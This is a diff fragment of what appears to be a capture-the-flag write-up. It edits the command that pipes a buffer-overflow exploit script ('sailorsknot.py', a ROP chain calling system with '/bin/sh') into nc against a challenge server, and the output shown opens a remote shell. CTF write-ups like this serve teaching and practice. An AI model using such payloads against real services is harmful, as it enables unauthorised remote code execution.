@@ -175,7 +175,7 @@ sys.stdout.buffer.write(OFFSET + POP_RDI + BIN_SH + CALL_SYSTEM + b'\x0a')
 
 Execute like this:
 ```
-$ (python3 sailorsknot.py; cat) | nc 46.101.107.117 2112                                                           130 ⨯
+$ (python3 sailorsknot.py; cat) | nc 46.101.107.117 2112
 Welcome! Please give me your name!
 > Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@, nice to meet you!
 id
